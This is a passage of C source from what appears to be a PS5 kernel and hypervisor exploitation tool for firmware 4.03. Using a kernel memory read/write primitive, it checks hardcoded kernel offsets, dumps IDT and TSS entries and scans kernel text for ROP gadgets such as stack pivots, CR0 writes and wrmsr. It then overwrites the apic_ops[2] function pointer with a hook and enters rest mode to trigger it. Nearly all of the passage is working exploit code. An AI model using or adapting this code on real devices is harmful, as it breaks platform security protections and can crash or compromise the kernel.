                printf("[+]\n");
                printf("[*] Restoring apic_ops[2] to original before rest mode.\n");
                if (hook_is_cave)
                    printf("    Cave trampoline: stale Global TLB entries on other CPUs\n"
                           "    still have NX=1 — can't INVLPG from userspace.\n");
                else
                    printf("    KLD pages may not be NPT-executable on secondary CPUs.\n");
                kernel_copyin(&original_xapic,
                              g_dmap_base + ops_pa + 0x10, 8);
                uint64_t restore_verify = 0;
                kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
                printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
                       (unsigned long)restore_verify,
                       restore_verify == original_xapic ? "OK" : "FAIL");

                /* Enter rest mode programmatically */
                printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
                fflush(stdout);
                fflush(stderr);
                notify("[HV Research] Entering rest mode in 3s...");
                sleep(3);
                int standby_ret = sceSystemStateMgrEnterStandby();
                printf("[*] sceSystemStateMgrEnterStandby() returned %d\n",
                       standby_ret);
                if (standby_ret != 0) {
                    printf("[!] Standby call failed (ret=%d, errno=%d).\n",
                           standby_ret, errno);
                    printf("[!] Falling back to manual rest mode entry.\n");
                    printf("[!] Navigate to: Settings → System → Power → Rest Mode\n");
                    notify("[HV Research] Auto-standby failed! Manually enter rest mode.");
                }
            } else {
                notify("[HV Research] Phase 7: Markers set. Enter REST MODE!");
            }
        }

        /* ─── Phase 8: IDT + kstuff offset verification ───
         *
         * Use known offsets from ps5-kstuff (EchoStretch/kstuff)
         * for FW 4.03.  These were found by flatz using
         * single-stepping and the porting tool.
         *
         * Key offsets (relative to kdata_base):
         *   idt         = +0x64cdc80  (101 MB into kdata!)
         *   tss_array   = +0x64d0830
         *   gdt_array   = +0x64cee30
         *   pcpu_array  = +0x64d2280
         *   doreti_iret = -0x9cf84c   (in ktext)
         *   nop_ret     = -0x9d20ca   (wrmsr_ret+2, a "ret")
         *   justreturn  = -0x9cf990   (Xjustreturn handler)
         *   push_pop_all_iret = -0x96be70  (Xinvtlb / int244)
         *
         * Negative offsets are ktext addresses:
         *   ktext addr = kdata_base + (signed offset)
         *   e.g. kdata_base - 0x9cf84c = kdata_base + 0xFF..63078B4
         *   but since ktext = kdata_base - kdata_to_ktext_delta,
         *   these resolve to valid ktext addresses.
         *
         * This is purely diagnostic — no modifications.
         */
        printf("\n=============================================\n");
        printf("  Phase 8: kstuff Offsets + IDT Verification\n");
        printf("=============================================\n\n");
        fflush(stdout);

        /* ── Known offsets from ps5-kstuff for FW 4.03 ── */
        #define KSTUFF_IDT_OFF         0x64cdc80ULL
        #define KSTUFF_GDT_OFF         0x64cee30ULL
        #define KSTUFF_TSS_OFF         0x64d0830ULL
        #define KSTUFF_PCPU_OFF        0x64d2280ULL
        #define KSTUFF_DORETI_IRET_OFF (-0x9cf84cLL)
        #define KSTUFF_NOP_RET_OFF     (-0x9d20caLL)   /* wrmsr_ret+2 */
        #define KSTUFF_JUSTRETURN_OFF  (-0x9cf990LL)
        #define KSTUFF_XINVTLB_OFF     (-0x96be70LL)   /* push_pop_all_iret */
        #define KSTUFF_QA_FLAGS_OFF    0x6506498ULL
        #define KSTUFF_SYSENTS_OFF     0x1709c0ULL
        #define KSTUFF_COPYIN_OFF      (-0x9908e0LL)
        #define KSTUFF_COPYOUT_OFF     (-0x990990LL)

        uint64_t ks_idt       = g_kdata_base + KSTUFF_IDT_OFF;
        uint64_t ks_tss       = g_kdata_base + KSTUFF_TSS_OFF;
        uint64_t ks_gdt       = g_kdata_base + KSTUFF_GDT_OFF;
        uint64_t ks_pcpu      = g_kdata_base + KSTUFF_PCPU_OFF;
        uint64_t ks_doreti    = g_kdata_base + (int64_t)KSTUFF_DORETI_IRET_OFF;
        uint64_t ks_nop_ret   = g_kdata_base + (int64_t)KSTUFF_NOP_RET_OFF;
        uint64_t ks_justret   = g_kdata_base + (int64_t)KSTUFF_JUSTRETURN_OFF;
        uint64_t ks_xinvtlb   = g_kdata_base + (int64_t)KSTUFF_XINVTLB_OFF;

        printf("[*] ps5-kstuff offsets for FW 4.03 (relative to kdata_base):\n");
        printf("    kdata_base:      0x%016lx\n", (unsigned long)g_kdata_base);
        printf("    ktext_base:      0x%016lx\n", (unsigned long)g_ktext_base);
        printf("\n");
        printf("    IDT:             0x%016lx  (kdata+0x%lx)\n",
               (unsigned long)ks_idt, (unsigned long)KSTUFF_IDT_OFF);
        printf("    GDT array:       0x%016lx  (kdata+0x%lx)\n",
               (unsigned long)ks_gdt, (unsigned long)KSTUFF_GDT_OFF);
        printf("    TSS array:       0x%016lx  (kdata+0x%lx)\n",
               (unsigned long)ks_tss, (unsigned long)KSTUFF_TSS_OFF);
        printf("    PCPU array:      0x%016lx  (kdata+0x%lx)\n",
               (unsigned long)ks_pcpu, (unsigned long)KSTUFF_PCPU_OFF);
        printf("\n");
        printf("    doreti_iret:     0x%016lx",
               (unsigned long)ks_doreti);
        if (ks_doreti >= g_ktext_base)
            printf("  (ktext+0x%lx)",
                   (unsigned long)(ks_doreti - g_ktext_base));
        printf("\n");
        printf("    nop_ret:         0x%016lx",
               (unsigned long)ks_nop_ret);
        if (ks_nop_ret >= g_ktext_base)
            printf("  (ktext+0x%lx)",
                   (unsigned long)(ks_nop_ret - g_ktext_base));
        printf("\n");
        printf("    justreturn:      0x%016lx",
               (unsigned long)ks_justret);
        if (ks_justret >= g_ktext_base)
            printf("  (ktext+0x%lx)",
                   (unsigned long)(ks_justret - g_ktext_base));
        printf("\n");
        printf("    Xinvtlb:         0x%016lx",
               (unsigned long)ks_xinvtlb);
        if (ks_xinvtlb >= g_ktext_base)
            printf("  (ktext+0x%lx)",
                   (unsigned long)(ks_xinvtlb - g_ktext_base));
        printf("\n");
        fflush(stdout);

        /* ── Verify IDT at the kstuff offset ── */
        printf("\n[*] Verifying IDT at kstuff offset...\n");
        uint64_t idt_pa = va_to_pa_quiet(ks_idt);
        if (!idt_pa) {
            printf("[-] IDT VA→PA failed (0x%lx not mapped).\n",
                   (unsigned long)ks_idt);
        } else {
            printf("    IDT PA: 0x%lx\n", (unsigned long)idt_pa);

            /* Read all 256 IDT entries */
            uint8_t idt_buf[256 * 16];
            kernel_copyout(g_dmap_base + idt_pa,
                           idt_buf, sizeof(idt_buf));

            /* Quick validation: check entries 0, 13, 14 */
            int idt_valid = 1;
            for (int check_vec = 0; check_vec <= 14;
                 check_vec += (check_vec == 0 ? 13 : 1)) {
                uint8_t *e = &idt_buf[check_vec * 16];
                if ((e[12] | e[13] | e[14] | e[15]) != 0 ||
                    !(e[5] & 0x80)) {
                    idt_valid = 0;
                    break;
                }
            }

            if (!idt_valid) {
                printf("[-] IDT validation FAILED — data at offset "
                       "doesn't look like IDT gates.\n");
                printf("    First 16 bytes: ");
                for (int i = 0; i < 16; i++)
                    printf("%02x ", idt_buf[i]);
                printf("\n");
            } else {
                printf("    IDT validated — entries 0, 13, 14 are "
                       "valid gates.\n\n");

                /* Parse interesting entries */
                struct { int vec; const char *name; } idt_names[] = {
                    {  0, "#DE div-by-zero"},
                    {  1, "#DB debug"},
                    {  2, "NMI"},
                    {  3, "#BP breakpoint"},
                    {  6, "#UD invalid-op"},
                    {  8, "#DF double-fault"},
                    { 13, "#GP general-prot"},
                    { 14, "#PF page-fault"},
                    { 18, "#MC machine-chk"},
                    { 32, "IRQ0 timer"},
                    {128, "int80 syscall"},
                    {244, "Xinvtlb (int244)"},
                };
                int n_names = sizeof(idt_names) / sizeof(idt_names[0]);

                printf("[*] IDT entries:\n");
                printf("    %-4s  %-20s  %-18s  %-4s %-4s "
                       "%-4s  %s\n",
                       "Vec", "Name", "Handler",
                       "IST", "Type", "DPL", "ktext+offset");
                printf("    ──────────────────────────────"
                       "───────────────────────────────────"
                       "──────\n");

                uint64_t gp_handler = 0;
                uint64_t xinvtlb_handler = 0;
                uint8_t  gp_ist = 0;

                for (int idx = 0; idx < n_names; idx++) {
                    int vec = idt_names[idx].vec;
                    uint8_t *e = &idt_buf[vec * 16];

                    uint64_t handler =
                        (uint64_t)(e[0] | (e[1] << 8)) |
                        ((uint64_t)(e[6] | (e[7] << 8)) << 16) |
                        ((uint64_t)(e[8] | (e[9] << 8) |
                                    (e[10] << 16) |
                                    (e[11] << 24))
                         << 32);
                    uint8_t ist  = e[4] & 0x7;
                    uint8_t tval = e[5] & 0xF;
                    uint8_t dpl  = (e[5] >> 5) & 0x3;
                    uint8_t pres = (e[5] >> 7) & 0x1;

                    int in_ktext = (handler >= g_ktext_base &&
                                    handler <
                                    g_ktext_base + 0x2000000);

                    printf("    %3d   %-20s  0x%016lx  "
                           "%d    ",
                           vec, idt_names[idx].name,
                           (unsigned long)handler, ist);
                    if (pres)
                        printf("0x%x   %d     ", tval, dpl);
                    else
                        printf("(not present)  ");
                    if (in_ktext)
                        printf("ktext+0x%lx",
                               (unsigned long)(handler -
                                               g_ktext_base));
                    printf("\n");

                    if (vec == 13) {
                        gp_handler = handler;
                        gp_ist = ist;
                    }
                    if (vec == 244) xinvtlb_handler = handler;
                }

                /* Count ktext handlers */
                int ktext_handlers = 0;
                for (int vec = 0; vec < 256; vec++) {
                    uint8_t *e = &idt_buf[vec * 16];
                    uint64_t h =
                        (uint64_t)(e[0] | (e[1] << 8)) |
                        ((uint64_t)(e[6] | (e[7] << 8)) << 16) |
                        ((uint64_t)(e[8] | (e[9] << 8) |
                                    (e[10] << 16) |
                                    (e[11] << 24))
                         << 32);
                    if (h >= g_ktext_base &&
                        h < g_ktext_base + 0x2000000)
                        ktext_handlers++;
                }
                printf("\n    %d of 256 handlers in ktext range\n",
                       ktext_handlers);

                /* Cross-verify Xinvtlb from IDT vs kstuff */
                printf("\n[*] Cross-verification:\n");
                printf("    Xinvtlb from IDT[244]: 0x%016lx\n",
                       (unsigned long)xinvtlb_handler);
                printf("    Xinvtlb from kstuff:   0x%016lx  %s\n",
                       (unsigned long)ks_xinvtlb,
                       xinvtlb_handler == ks_xinvtlb
                       ? "[MATCH]" : "[MISMATCH]");
                printf("    #GP handler (int 13):  0x%016lx  IST=%d\n",
                       (unsigned long)gp_handler, gp_ist);
            }
        }

        /* ── Verify TSS at the kstuff offset ── */
        printf("\n[*] Verifying TSS at kstuff offset...\n");
        uint64_t tss_pa = va_to_pa_quiet(ks_tss);
        if (!tss_pa) {
            printf("[-] TSS VA→PA failed.\n");
        } else {
            printf("    TSS PA: 0x%lx\n", (unsigned long)tss_pa);

            /* TSS layout (AMD64):
             *   0x04: RSP0 (8 bytes)
             *   0x24 + (ist-1)*8: IST1..IST7 (8 bytes each)
             */
            uint8_t tss_data[0x68];
            kernel_copyout(g_dmap_base + tss_pa,
                           tss_data, sizeof(tss_data));

            uint64_t rsp0 = 0;
            memcpy(&rsp0, &tss_data[0x04], 8);
            printf("    RSP0 (ring-0 stack): 0x%016lx\n",
                   (unsigned long)rsp0);

            int tss_valid = (rsp0 >= 0xFFFF800000000000ULL);
            printf("    TSS looks %s\n\n",
                   tss_valid ? "valid" : "INVALID");

            if (tss_valid) {
                printf("    IST entries (CPU 0):\n");
                for (int ist = 1; ist <= 7; ist++) {
                    uint64_t ist_val = 0;
                    memcpy(&ist_val,
                           &tss_data[0x24 + (ist - 1) * 8], 8);
                    printf("      IST%d: 0x%016lx%s\n",
                           ist, (unsigned long)ist_val,
                           ist_val ? "" : " (unused)");
                }
            }
        }

        /* ── Summary ── */
        printf("\n[+] ============================================\n");
        printf("[+]  PHASE 8 SUMMARY\n");
        printf("[+] ============================================\n");
        printf("[+]  kstuff offsets loaded for FW 4.03\n");
        printf("[+]\n");
        printf("[+]  Key ktext gadgets (from kstuff):\n");
        printf("[+]    nop_ret (bare ret):  0x%016lx\n",
               (unsigned long)ks_nop_ret);
        printf("[+]    doreti_iret:         0x%016lx\n",
               (unsigned long)ks_doreti);
        printf("[+]    justreturn:          0x%016lx\n",
               (unsigned long)ks_justret);
        printf("[+]\n");
        printf("[+]  nop_ret is a bare 'ret' in ktext (ROP gadget).\n");
        printf("[!]  WARNING: NOT safe for apic_ops[2] — bare ret returns\n");
        printf("[!]  garbage in eax.  xapic_mode MUST return 1 (xAPIC).\n");
        printf("[!]  Use 'mov eax, 1; ret' gadget instead.\n");

        printf("\n");
        fflush(stdout);

        return;
    }

    /* ── ktext IS readable — we're in post-resume state! ── */
    printf("\n[+] *** ktext IS READABLE via DMAP! ***\n");
    printf("[+] HV reinitialized without XOM — Byepervisor method WORKS on FW 4.03!\n\n");
    notify("[HV Research] ktext readable! Scanning for gadgets...");
    fflush(stdout);

    /* ─── Gadget scan ─── */
    printf("[*] Scanning ktext for ROP gadgets...\n");
    printf("    Scan range: 0x%lx — 0x%lx (%luMB)\n",
           (unsigned long)g_ktext_base,
           (unsigned long)ktext_end,
           (unsigned long)(ktext_scan_size >> 20));
    fflush(stdout);

    /*
     * Gadget patterns we're looking for:
     * These are useful for the apic_ops xapic_mode hook, where
     * xapic_mode is int(*)(void) — no args, returns APIC mode.
     * MUST return 1 (xAPIC) for LAPIC suspend to work correctly.
     */
    static const uint8_t pat_ret[]           = { 0xC3 };
    static const uint8_t pat_xchg_rsp_rax[]  = { 0x48, 0x94, 0xC3 };
    static const uint8_t pat_mov_cr0_rax[]   = { 0x0F, 0x22, 0xC0 };
    static const uint8_t pat_mov_rax_cr0[]   = { 0x0F, 0x20, 0xC0 };
    static const uint8_t pat_wrmsr[]         = { 0x0F, 0x30 };
    static const uint8_t pat_rdmsr[]         = { 0x0F, 0x32 };
    static const uint8_t pat_pop_rdi_ret[]   = { 0x5F, 0xC3 };
    static const uint8_t pat_pop_rsi_ret[]   = { 0x5E, 0xC3 };
    static const uint8_t pat_pop_rdx_ret[]   = { 0x5A, 0xC3 };
    static const uint8_t pat_pop_rcx_ret[]   = { 0x59, 0xC3 };
    static const uint8_t pat_pop_rax_ret[]   = { 0x58, 0xC3 };
    static const uint8_t pat_pop_rsp_ret[]   = { 0x5C, 0xC3 };
    static const uint8_t pat_mov_rsp_rax[]   = { 0x48, 0x89, 0xC4, 0xC3 };
    /* mov [rdi], rax; ret — write gadget (useful if rdi is controlled) */
    static const uint8_t pat_mov_rdi_rax[]   = { 0x48, 0x89, 0x07, 0xC3 };
    /* xor eax, eax; ret — returns 0 (UNSAFE for xapic_mode hook!) */
    static const uint8_t pat_xor_eax_ret[]   = { 0x31, 0xC0, 0xC3 };
    /* push rbp; mov rbp, rsp — function prologue (CFI valid target) */
    static const uint8_t pat_prologue[]      = { 0x55, 0x48, 0x89, 0xE5 };
    /* mov eax, 1; ret — returns 1 (correct xAPIC mode for LAPIC suspend) */
    static const uint8_t pat_mov_eax_1_ret[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
    /* wrmsr; ... ret (wrmsr followed by ret within 4 bytes) */
    static const uint8_t pat_wrmsr_ret[]     = { 0x0F, 0x30, 0xC3 };
    /* cli; ret (disable interrupts) */
    static const uint8_t pat_cli_ret[]       = { 0xFA, 0xC3 };
    /* sti; ret (enable interrupts) */
    static const uint8_t pat_sti_ret[]       = { 0xFB, 0xC3 };

    struct gadget_pattern gadgets[] = {
        { "ret",                  pat_ret,          1, 0 },
        { "pop rdi; ret",        pat_pop_rdi_ret,  2, 1 },
        { "pop rsi; ret",        pat_pop_rsi_ret,  2, 1 },
        { "pop rdx; ret",        pat_pop_rdx_ret,  2, 1 },
        { "pop rcx; ret",        pat_pop_rcx_ret,  2, 1 },
        { "pop rax; ret",        pat_pop_rax_ret,  2, 1 },
        { "pop rsp; ret",        pat_pop_rsp_ret,  2, 1 },
        { "xchg rsp, rax; ret",  pat_xchg_rsp_rax, 3, 1 },
        { "mov rsp, rax; ret",   pat_mov_rsp_rax,  4, 1 },
        { "xor eax, eax; ret",   pat_xor_eax_ret,  3, 1 },
        { "mov cr0, rax",        pat_mov_cr0_rax,  3, 1 },
        { "mov rax, cr0",        pat_mov_rax_cr0,  3, 1 },
        { "wrmsr; ret",          pat_wrmsr_ret,    3, 1 },
        { "wrmsr",               pat_wrmsr,        2, 0 },
        { "rdmsr",               pat_rdmsr,        2, 0 },
        { "mov [rdi], rax; ret", pat_mov_rdi_rax,  4, 1 },
        { "cli; ret",            pat_cli_ret,      2, 1 },
        { "sti; ret",            pat_sti_ret,      2, 1 },
        { "push rbp; mov rbp, rsp (prologue)", pat_prologue, 4, 0 },
        { "mov eax, 1; ret",    pat_mov_eax_1_ret, 6, 1 },
    };
    int n_gadgets = sizeof(gadgets) / sizeof(gadgets[0]);

    /* Track first 8 hits per gadget type */
    #define MAX_HITS_PER_GADGET 8
    struct {
        uint64_t addrs[MAX_HITS_PER_GADGET];
        int count;
    } hits[sizeof(gadgets) / sizeof(gadgets[0])];
    memset(hits, 0, sizeof(hits));

    /* Count some special gadgets */
    int total_ret = 0;
    int total_wrmsr = 0;
    int total_prologues = 0;

    /*
     * Scan ktext 4KB at a time via DMAP.
     * For each chunk, search for all gadget patterns.
     */
    uint8_t chunk[0x1000];
    uint64_t chunks_read = 0;
    uint64_t chunks_failed = 0;

    for (uint64_t off = 0; off < ktext_scan_size; off += 0x1000) {
        uint64_t page_va = g_ktext_base + off;
        uint64_t page_pa = va_to_pa_quiet(page_va);
        if (page_pa == 0 || page_pa >= MAX_SAFE_PA) {
            chunks_failed++;
            continue;
        }

        int ret = kernel_copyout(g_dmap_base + page_pa, chunk, 0x1000);
        if (ret != 0) {
            chunks_failed++;
            continue;
        }
        chunks_read++;

        /* Search this chunk for all patterns */
        for (int g = 0; g < n_gadgets; g++) {
            int plen = gadgets[g].len;
            for (int bi = 0; bi <= 0x1000 - plen; bi++) {
                if (memcmp(&chunk[bi], gadgets[g].bytes, plen) == 0) {
                    uint64_t gadget_kva = page_va + bi;

                    /* Track counts for common gadgets */
                    if (g == 0) total_ret++;
                    else if (g == 13) total_wrmsr++;
                    else if (g == 18) total_prologues++;

                    /* Store first N hits */
                    if (hits[g].count < MAX_HITS_PER_GADGET) {
                        hits[g].addrs[hits[g].count] = gadget_kva;
                    }
                    hits[g].count++;
                }
            }
        }

        /* Progress every 4MB */
        if ((off & 0x3FFFFF) == 0 && off > 0) {
            printf("    ... scanned %luMB / %luMB\n",
                   (unsigned long)(off >> 20),
                   (unsigned long)(ktext_scan_size >> 20));
            fflush(stdout);
        }
    }

    printf("[+] Scan complete: %lu chunks read, %lu failed\n\n",
           (unsigned long)chunks_read, (unsigned long)chunks_failed);

    /* ─── Report all found gadgets ─── */
    printf("=== ROP Gadget Scan Results ===\n\n");

    printf("Summary counts:\n");
    printf("    ret instructions:     %d\n", total_ret);
    printf("    wrmsr instructions:   %d\n", total_wrmsr);
    printf("    function prologues:   %d\n\n", total_prologues);

    printf("Useful gadgets found:\n");
    printf("%-30s  %6s  %-20s  %s\n",
           "Gadget", "Count", "First Address", "ktext+offset");
    printf("─────────────────────────────────────────────"
           "─────────────────────────────────\n");

    for (int g = 0; g < n_gadgets; g++) {
        if (hits[g].count == 0) continue;

        /* Highlight useful gadgets */
        const char *marker = gadgets[g].useful ? "[*]" : "   ";

        printf("%s %-27s  %6d",
               marker, gadgets[g].name, hits[g].count);

        if (hits[g].count > 0) {
            printf("  0x%016lx  ktext+0x%lx",
                   (unsigned long)hits[g].addrs[0],
                   (unsigned long)(hits[g].addrs[0] - g_ktext_base));
        }
        printf("\n");

        /* Print additional hits for useful gadgets */
        if (gadgets[g].useful) {
            int show = hits[g].count < MAX_HITS_PER_GADGET ?
                       hits[g].count : MAX_HITS_PER_GADGET;
            for (int h = 1; h < show; h++) {
                printf("    %36s0x%016lx  ktext+0x%lx\n",
                       "",
                       (unsigned long)hits[g].addrs[h],
                       (unsigned long)(hits[g].addrs[h] - g_ktext_base));
            }
            if (hits[g].count > MAX_HITS_PER_GADGET) {
                printf("    %36s... and %d more\n",
                       "", hits[g].count - MAX_HITS_PER_GADGET);
            }
        }
    }

    /* ─── Identify best gadgets for the flatz exploit chain ─── */
    printf("\n=== Recommended Gadgets for Flatz Method ===\n\n");

    /*
     * For the apic_ops xapic_mode hook:
     *   - xapic_mode is int(*)(void): no args, returns APIC mode (1=xAPIC)
     *   - Called from cpususpend_handler during resume
     *   - MUST return 1 (APIC_MODE_XAPIC) — returning 0 panics LAPIC suspend
     *
     * Strategy 1: "Safe hook" — write "mov eax, 1; ret" to return correct xAPIC mode
     *   apic_ops[2] = &gadget → returns 1 (APIC_MODE_XAPIC) → system resumes
     *
     * Strategy 2: Stack pivot → full ROP chain
     *   Requires: "pop rsp; ret" or "xchg rsp, rax; ret"
     *   Place ROP chain at known DMAP address, pivot to it
     *
     * Strategy 3: Direct action
     *   "mov cr0, rax; ret" — if RAX has WP cleared, disables write protect
     *   "wrmsr; ret" — if ECX/EAX/EDX are set up, writes arbitrary MSR
     */

    /* Strategy 1: Safe hook — return correct xAPIC mode */
    if (hits[19].count > 0) {
        printf("[STRATEGY 1] Safe hook (returns 1 = xAPIC mode):\n");
        printf("    Gadget: mov eax, 1; ret at 0x%lx (ktext+0x%lx)\n",
               (unsigned long)hits[19].addrs[0],
               (unsigned long)(hits[19].addrs[0] - g_ktext_base));
        printf("    Write this to apic_ops[2], trigger suspend/resume.\n");
        printf("    xapic_mode returns 1 → LAPIC suspend works correctly.\n\n");
    } else if (hits[0].count > 0) {
        printf("[STRATEGY 1] Bare ret (RISKY — xapic_mode returns garbage):\n");
        printf("    Gadget: ret at 0x%lx (ktext+0x%lx)\n",
               (unsigned long)hits[0].addrs[0],
               (unsigned long)(hits[0].addrs[0] - g_ktext_base));
        printf("    WARNING: xapic_mode must return 1 — bare ret returns\n");
        printf("    undefined value → likely kernel panic during suspend!\n\n");
    }

    /* Strategy 2: Stack pivot */
    int pivot_idx = -1;
    /* Prefer pop rsp; ret (index 6) */
    if (hits[6].count > 0) pivot_idx = 6;
    /* Fallback: xchg rsp, rax; ret (index 7) */
    else if (hits[7].count > 0) pivot_idx = 7;
    /* Fallback: mov rsp, rax; ret (index 8) */
    else if (hits[8].count > 0) pivot_idx = 8;

    if (pivot_idx >= 0) {
        printf("[STRATEGY 2] Stack pivot (full ROP chain):\n");
        printf("    Gadget: %s at 0x%lx (ktext+0x%lx)\n",
               gadgets[pivot_idx].name,
               (unsigned long)hits[pivot_idx].addrs[0],
               (unsigned long)(hits[pivot_idx].addrs[0] - g_ktext_base));
        printf("    Place ROP chain in kernel memory (via DMAP write)\n");
        printf("    Set apic_ops[2] = this gadget address\n");
        printf("    On resume: pivots stack → ROP chain executes\n\n");
    } else {
        printf("[STRATEGY 2] Stack pivot: NO suitable gadget found.\n\n");
    }

    /* Strategy 3: Direct CR0 control */
    if (hits[10].count > 0 && hits[11].count > 0) {
        printf("[STRATEGY 3] Direct CR0 manipulation:\n");
        printf("    Read:  mov rax, cr0 at 0x%lx\n",
               (unsigned long)hits[11].addrs[0]);
        printf("    Write: mov cr0, rax at 0x%lx\n",
               (unsigned long)hits[10].addrs[0]);
        printf("    Combined with pop rax; ret to control RAX value.\n\n");
    }

    /* ROP chain building blocks */
    printf("=== ROP Chain Building Blocks ===\n");
    printf("    pop rdi; ret:  %s\n",
           hits[1].count > 0 ?
           "FOUND" : "NOT FOUND");
    printf("    pop rsi; ret:  %s\n",
           hits[2].count > 0 ?
           "FOUND" : "NOT FOUND");
    printf("    pop rdx; ret:  %s\n",
           hits[3].count > 0 ?
           "FOUND" : "NOT FOUND");
    printf("    pop rcx; ret:  %s\n",
           hits[4].count > 0 ?
           "FOUND" : "NOT FOUND");
    printf("    pop rax; ret:  %s\n",
           hits[5].count > 0 ?
           "FOUND" : "NOT FOUND");
    printf("    wrmsr; ret:    %s\n",
           hits[12].count > 0 ?
           "FOUND" : "NOT FOUND");
    printf("    mov cr0, rax:  %s\n",
           hits[10].count > 0 ?
           "FOUND" : "NOT FOUND");
    printf("    mov eax,1;ret: %s\n",
           hits[19].count > 0 ?
           "FOUND" : "NOT FOUND");

    int rop_ready = (hits[1].count > 0) && (hits[5].count > 0) &&
                    (hits[0].count > 0);
    printf("\n[%c] Sufficient gadgets for basic ROP chain: %s\n",
           rop_ready ? '+' : '-',
           rop_ready ? "YES" : "NO");

    if (rop_ready) {
        printf("\n[+] ============================================\n");
        printf("[+]  GADGETS FOUND — READY FOR APIC_OPS HOOK\n");
        printf("[+] ============================================\n");
    }

    /*
     * ─── Phase 7 Cycle 2: Hook apic_ops[2] → safe hook target ───
     *
     * We are in the post-XOM-bypass state (ktext is readable).
     * Hook apic_ops[2] to a target that returns the correct APIC
     * mode value.  xapic_mode() is int(*)(void) — it MUST return
     * 1 (APIC_MODE_XAPIC) for the LAPIC suspend sequence to work.
     * Returning 0 (xor eax, eax; ret) or garbage (bare ret) causes
     * kernel panic during suspend — the LAPIC shutdown path depends
     * on this return value.
     *
     * Priority:
     *   1. KLD trampoline_xapic_mode() (calls original, returns real value)
     *   2. "mov eax, 1; ret" ktext gadget (returns 1 = xAPIC mode)
     *   3. Skip hook (no safe target available)
     *
     * KLD trampoline is preferred because it calls the original function
     * and returns the real APIC mode value.  The hardcoded gadget always
     * returns 1 (APIC_MODE_XAPIC), which is wrong if the system uses
     * x2APIC mode (return value 3) — causing kernel panic on suspend.
     */
    uint64_t gadget_addr = 0;
    const char *gadget_name = NULL;
    int gadget_in_ktext = 0;

    /* Priority 1: KLD trampoline (transparent passthrough to original) */
    if (g_kmod_trampoline_func) {
        gadget_addr = g_kmod_trampoline_func;
        gadget_name = "KLD trampoline_xapic_mode() (calls original)";
        gadget_in_ktext = 0;  /* in KLD .text, not ktext */
    }

    /* Priority 2: "mov eax, 1; ret" — fallback if KLD unavailable */
    if (!gadget_addr && hits[19].count > 0) {
        gadget_addr = hits[19].addrs[0];
        gadget_name = "mov eax, 1; ret (returns 1 = xAPIC)";
        gadget_in_ktext = (gadget_addr >= g_ktext_base &&
                           gadget_addr < g_ktext_base + 0x2000000);
        if (!gadget_in_ktext) gadget_addr = 0;
    }

    if (gadget_addr) {
        printf("\n[*] Phase 7 Cycle 2: Hooking apic_ops[2] → safe target\n\n");
        printf("    Target: %s\n", gadget_name);
        printf("    Address: 0x%016lx\n", (unsigned long)gadget_addr);
        if (gadget_in_ktext)
            printf("    (ktext+0x%lx)\n",
                   (unsigned long)(gadget_addr - g_ktext_base));

        /* Resolve apic_ops physical address (ops_pa was in Phase 7 scope) */
        uint64_t hook_ops_pa = va_to_pa_quiet(g_apic_ops_addr);

        if (!hook_ops_pa) {
            printf("[-] apic_ops VA→PA failed — aborting hook.\n");
        } else {
            /* Read current apic_ops[2] value */
            uint64_t current_xapic = 0;
            kernel_copyout(g_dmap_base + hook_ops_pa + 0x10, &current_xapic, 8);
            printf("    Current apic_ops[2]: 0x%016lx\n",
                   (unsigned long)current_xapic);

            /* If using KLD trampoline, patch g_trampoline_target first */
            if (!gadget_in_ktext && g_kmod_trampoline_func &&
                g_kmod_trampoline_target) {
                printf("    Patching trampoline target → 0x%016lx (original xapic)\n",
                       (unsigned long)current_xapic);
                kernel_copyin(&current_xapic,
                              g_dmap_base + va_to_pa_quiet(g_kmod_trampoline_target),
                              8);
            }

            /* Save original in cave marker (if not already there) */
            uint64_t cave_pa_h = va_to_pa_quiet(g_kdata_base);
            if (cave_pa_h) {
                uint8_t cave_check[P7_MARKER_SIZE];
                kernel_copyout(g_dmap_base + cave_pa_h, cave_check, P7_MARKER_SIZE);
                uint64_t existing_magic = 0;
                memcpy(&existing_magic, &cave_check[0x00], 8);

                if (existing_magic == P7_CAVE_MAGIC) {
                    printf("    Cave marker from cycle 1 detected — good.\n");
                    uint64_t saved_orig = 0;
                    memcpy(&saved_orig, &cave_check[0x08], 8);
                    printf("    Original xapic (from cave): 0x%016lx\n",
                           (unsigned long)saved_orig);
                } else {
                    printf("    No cave marker — saving original xapic now.\n");
                    uint8_t new_marker[P7_MARKER_SIZE];
                    memset(new_marker, 0, sizeof(new_marker));
                    uint64_t magic = P7_CAVE_MAGIC;
                    memcpy(&new_marker[0x00], &magic, 8);
                    memcpy(&new_marker[0x08], &current_xapic, 8);
                    memcpy(&new_marker[0x10], &g_ktext_base, 8);
                    kernel_copyin(new_marker, g_dmap_base + cave_pa_h,
                                  P7_MARKER_SIZE);
                }
            }

            /* Write the hook target address to apic_ops[2] */
            printf("\n    Writing hook target to apic_ops[2]...\n");
            kernel_copyin(&gadget_addr, g_dmap_base + hook_ops_pa + 0x10, 8);

            /* Verify the write */
            uint64_t verify_hook = 0;
            kernel_copyout(g_dmap_base + hook_ops_pa + 0x10, &verify_hook, 8);
            int hook_ok = (verify_hook == gadget_addr);
            printf("    Verify: 0x%016lx %s\n",
                   (unsigned long)verify_hook,
                   hook_ok ? "[OK]" : "[MISMATCH]");

            if (hook_ok) {
                printf("\n[+] ============================================\n");
                printf("[+]  APIC_OPS[2] HOOKED → SAFE TARGET!\n");
                printf("[+] ============================================\n");
                printf("[+]\n");
                printf("[+] Hook details:\n");
                printf("[+]   apic_ops[2] → 0x%016lx\n",
                       (unsigned long)gadget_addr);
                printf("[+]   Target: %s\n", gadget_name);
                printf("[+]   Returns: real APIC mode value — safe for LAPIC suspend\n");
                printf("[+]   NX clearing: NOT NEEDED\n");
                printf("[+]\n");
                printf("[+] NEXT STEPS:\n");
                printf("[+]   1. Entering REST MODE programmatically\n");
                printf("[+]   2. On resume: cpususpend_handler calls\n");
                printf("[+]      xapic_mode → our target → returns 1\n");
                printf("[+]   3. LAPIC suspend completes normally\n");
                printf("[+]   4. Replace with stack pivot for full ROP\n");

                /* Store hook-armed state in QA flags */
                uint8_t qa_hook[16];
                kernel_get_qaflags(qa_hook);
                qa_hook[0] = 0xFF;
                qa_hook[1] = 0xFF;
                uint32_t hook_marker = PHASE7_MARKER;
                memcpy(&qa_hook[4], &hook_marker, 4);
                memcpy(&qa_hook[8], &current_xapic, 8);
